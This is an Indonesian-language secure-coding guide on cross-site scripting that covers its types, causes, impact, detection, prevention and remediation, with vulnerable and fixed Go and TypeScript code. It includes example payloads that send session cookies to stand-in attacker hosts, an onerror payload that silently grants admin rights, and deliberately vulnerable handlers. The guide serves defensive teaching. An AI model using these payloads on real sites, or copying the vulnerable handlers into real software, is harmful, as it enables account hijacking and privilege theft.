# Cross-Site Scripting (XSS)

> **Metadata Keamanan:**
> - **CWE**: [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
> - **OWASP**: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
> - **Tingkat Keparahan (Severity)**: Medium / High (CVSS ~ 6.1 - 8.8)

---

## 1. Pengertian

**Cross-Site Scripting (XSS)** adalah celah keamanan di mana penyerang menyisipkan skrip berbahaya (biasanya JavaScript) ke dalam halaman web yang sah, sehingga skrip tersebut otomatis dieksekusi di dalam peramban (browser) pengguna lain saat mereka membuka halaman tersebut.

**Analogi Sederhana:**  
Bayangkan papan pengumuman umum di sebuah perumahan. Warga diizinkan menempel catatan pengumuman.  
Seorang penipu menempelkan kertas pengumuman bertuliskan:  
*"Kepada warga, satpam sedang sakit. Silakan tinggalkan kunci rumah Anda di kotak kardus di bawah tiang ini."*  
Warga lain yang membaca papan tersebut percaya bahwa instruksi itu resmi dari pengurus perumahan, lalu menyerahkan kunci mereka. Papan pengumuman (aplikasi web) gagal membedakan antara informasi aman dan tipuan berbahaya yang menipu pembacanya.

---

## 2. Cara Kerja

Browser mempercayai semua kode JavaScript yang dikirimkan oleh server web suatu situs. Jika sebuah aplikasi web menerima teks dari pengguna dan menampilkannya kembali ke layar tanpa melakukan **encoding/escaping** karakter HTML, browser akan mengira teks tersebut adalah tag kode HTML/JS resmi:

```html
<!-- Server merender komentar pengguna secara mentah: -->
<p>Komentar: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script></p>
```

Browser korban membaca tag `<script>`, lalu menjalankan perintah di dalamnya: mengirimkan cookie sesi pengguna ke server penyerang.

### Tiga Jenis Utama XSS:
1. **Stored XSS (Persistent)**: Skrip berbahaya disimpan secara permanen di database server (misal di kolom komentar produk atau ulasan pembeli). Setiap kali ada orang yang membuka halaman tersebut, skrip otomatis berjalan. Ini adalah jenis paling berbahaya.
2. **Reflected XSS (Non-Persistent)**: Skrip berasal dari permintaan URL saat ini (misal hasil pencarian: `toko.example/search?q=<script>...`). Skrip hanya berjalan jika korban mengklik tautan khusus yang dikirimkan penyerang.
3. **DOM-based XSS**: Celah terjadi sepenuhnya di sisi browser (klien), saat JavaScript frontend membaca data dari URL (`location.search` atau `location.hash`) dan menuliskannya ke halaman menggunakan fungsi berbahaya seperti `innerHTML` atau `eval()`.

---

## 3. Penyebab

- **Menampilkan Input Mentah ke HTML (Unescaped Output)**: Tidak mengubah karakter khusus HTML seperti `<`, `>`, `&`, `"`, dan `'` menjadi entitas HTML aman (`&lt;`, `&gt;`, `&amp;`, dll.).
- **Penggunaan API Frontend Berbahaya**: Menggunakan `innerHTML`, `outerHTML`, atau `document.write` di JavaScript daripada properti aman seperti `textContent` atau `innerText`.
- **Tidak Memasang Content Security Policy (CSP)**: Tidak membatasi sumber skrip yang boleh dimuat oleh browser.

---

## 4. Skenario Serangan

1. **Injeksi**: Penyerang memasukkan teks ulasan produk di situs belanja:
   `<script>document.location='http://hacker.site/log?c='+document.cookie</script>`.
2. **Penyimpanan**: Sistem menyimpan teks ulasan tersebut ke database tanpa filtering.
3. **Penyebaran**: Pelanggan lain atau admin membuka halaman produk tersebut.
4. **Eksekusi**: Browser pelanggan memuat halaman produk, menemukan tag `<script>`, dan mengeksekusi JavaScript tersebut.
5. **Pencurian Sesi**: Cookie sesi korban terkirim ke server penyerang. Penyerang menyalin cookie tersebut ke browser miliknya dan langsung masuk sebagai korban tanpa perlu login.

---

## 5. Dampak

- **Pembajakan Akun (Session Hijacking)**: Penyerang mencuri cookie sesi atau token otentikasi (JWT) yang disimpan di `localStorage`.
- **Defacement & Phishing Palsu**: Penyerang memanipulasi tampilan halaman web (misalnya menampilkan form login palsu di atas website asli untuk mencuri kata sandi).
- **Aksi Tanpa Izin Atas Nama Korban**: Skrip dapat melakukan transfer uang, mengubah alamat email, atau memposting konten menggunakan identitas korban.

---

## 6. Bagian Sistem yang Terdampak

- Kolom komentar, ulasan produk, dan forum diskusi.
- Halaman profil pengguna (nama display, bio, status).
- Kolom pencarian yang menampilkan kembali teks yang dicari ("Menampilkan hasil untuk: ...").
- Kotak pesan/chat antar pengguna.

---

## 7. Contoh Kasus Nyata dalam Sebuah Sistem

> *Catatan: Kasus berikut adalah simulasi edukatif yang realistis untuk mempermudah pemahaman.*

**Sistem Ulasan E-Commerce BelanjaYuk:**  
BelanjaYuk memiliki fitur ulasan pembeli. Di dashboard admin, tim customer service secara rutin memeriksa keluhan pelanggan.

Penyerang membeli barang murah dan menulis keluhan:
```html
Barang rusak! <img src="x" onerror="fetch('/api/admin/promote-user?id=99', {method:'POST'})">
```

Saat admin membuka halaman dashboard untuk meninjau keluhan tersebut, browser admin memproses tag `<img>`. Karena gambar `src="x"` gagal dimuat, fungsi `onerror` langsung aktif. Perintah POST dikirimkan dari browser admin yang memiliki hak istimewa tinggi, mengangkat akun penyerang (ID 99) menjadi admin toko tanpa disadari oleh admin yang bertugas.

---

## 8. Cara Mendeteksi

- **SAST**: Pemindai kode mendeteksi penggunaan `template.HTML()` di Go atau `dangerouslySetInnerHTML` di React.
- **DAST**: Mengirimkan payload XSS standar seperti `<svg onload=alert(1)>` dan memeriksa apakah tag tersebut dipantulkan tanpa enkoding.
- **Manual Review**: Periksa bagian kode frontend yang merender konten dinamis ke dalam DOM.

---

## 9. Pencegahan

1. **Context-Aware Output Encoding (Wajib)**: Selalu lakukan enkoding pada data masukan pengguna sebelum dimasukkan ke dalam HTML body, atribut tag, atau JavaScript string. Gunakan engine template modern yang melakukan auto-escaping secara default (seperti `html/template` di Go, JSX di React, atau template engine Vue).
2. **Gunakan Atribut Cookie `HttpOnly`**: Atur bendera `HttpOnly` pada cookie sesi agar JavaScript di browser sama sekali tidak bisa membaca cookie tersebut (`document.cookie` menjadi kosong). Ini memitigasi dampak pencurian sesi via XSS.
3. **Terapkan Content Security Policy (CSP)**: Konfigurasikan HTTP header `Content-Security-Policy: default-src 'self'` untuk melarang eksekusi skrip *inline* (`<script>`) dan domain asing.
4. **Sanitasi HTML Khusus (Jika Menerima Rich-Text)**: Jika sistem memang harus mengizinkan teks berformat (bold/italic dari WYSIWYG editor), gunakan pustaka sanitasi ketat seperti `DOMPurify` (JS) atau `bluemonday` (Go).

---

## 10. Penanganan

1. **Pembersihan Database Segera**: Cari dan bersihkan data tersimpan yang mengandung tag `<script>` atau atribut `onload/onerror`.
2. **Invalidasi Seluruh Sesi Aktif**: Jika terjadi Stored XSS di halaman publik yang ramai, cabut seluruh token sesi pengguna untuk menggugurkan cookie yang mungkin sudah dicuri.
3. **Rilis Patch Escaping**: Pastikan seluruh titik rendering menggunakan fungsi escaping yang benar.

---

## 11. Contoh Implementasi

### A. Contoh dalam Golang

```go
package main

import (
	"html"
	"html/template"
	"net/http"
)

// ❌ KODE RENTAN (Vulnerable)
// Menulis input langsung ke respon HTTP tanpa escaping, atau menggunakan text/template alih-alih html/template
func CommentHandlerVulnerable(w http.ResponseWriter, r *http.Request) {
	userComment := r.URL.Query().Get("comment")
	// Jika userComment = "<script>alert('XSS')</script>"
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte("<div>Komentar: " + userComment + "</div>"))
}

// ✅ KODE AMAN (Secure)
// Menggunakan html/template bawaan Go yang secara otomatis melakukan context-aware escaping
var tmpl = template.Must(template.New("comment").Parse(`<div>Komentar: {{ . }}</div>`))

func CommentHandlerSecure(w http.ResponseWriter, r *http.Request) {
	userComment := r.URL.Query().Get("comment")
	w.Header().Set("Content-Type", "text/html")

	// html/template otomatis mengubah <script> menjadi &lt;script&gt;
	tmpl.Execute(w, userComment)
}

// Atau jika merangkai manual, wajib gunakan html.EscapeString:
func ManualEscape(raw string) string {
	return html.EscapeString(raw)
}
```

### B. Contoh dalam TypeScript (Frontend & Backend Node.js)

```typescript
import DOMPurify from 'dompurify';

// ❌ KODE RENTAN (Vulnerable - Frontend)
// Menggunakan innerHTML secara langsung dengan data yang belum disanitasi
export function renderCommentVulnerable(container: HTMLElement, userBio: string) {
  // Input: <img src=x onerror="alert('Hacked')">
  container.innerHTML = `<div class="user-bio">${userBio}</div>`;
}

// ✅ KODE AMAN (Secure - Opsi 1: textContent)
// Untuk teks biasa, SELALU gunakan textContent (tidak pernah mengeksekusi tag HTML)
export function renderCommentSecureText(container: HTMLElement, userBio: string) {
  const bioDiv = document.createElement('div');
  bioDiv.className = 'user-bio';
  bioDiv.textContent = userBio; // Browser otomatis memperlakukan input sebagai teks murni
  container.appendChild(bioDiv);
}

// ✅ KODE AMAN (Secure - Opsi 2: DOMPurify untuk HTML Kaya)
// Jika pengguna diizinkan menggunakan tag bold/italic dari editor teks kaya
export function renderRichCommentSecure(container: HTMLElement, richText: string) {
  // DOMPurify membersihkan tag berbahaya (<script>, onerror, iframe) dan hanya menyisakan tag aman (b, i, p)
  const cleanHTML = DOMPurify.sanitize(richText);
  container.innerHTML = cleanHTML;
}
```

---

## 12. Pengujian dan Verifikasi

### Pengujian Lokal dengan Browser Developer Tools
1. Masukkan payload berikut pada form komentar lokal:
   ```html
   <script>console.log("XSS_TERDETEKSI");</script>
   ```
2. Buka *Inspect Element* / *Developer Tools* -> tab *Console*.
- **Kondisi Rentan**: Muncul log `XSS_TERDETEKSI` di konsol browser.
- **Kondisi Aman**: Tidak ada log di konsol. Teks muncul di layar persis sebagai tulisan `<script>console.log("XSS_TERDETEKSI");</script>` dan di inspect element terlihat sebagai entitas teks `&lt;script&gt;`.

---

## Referensi

- [OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger: Cross-site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- [MITRE CWE-79](https://cwe.mitre.org/data/definitions/79.html)
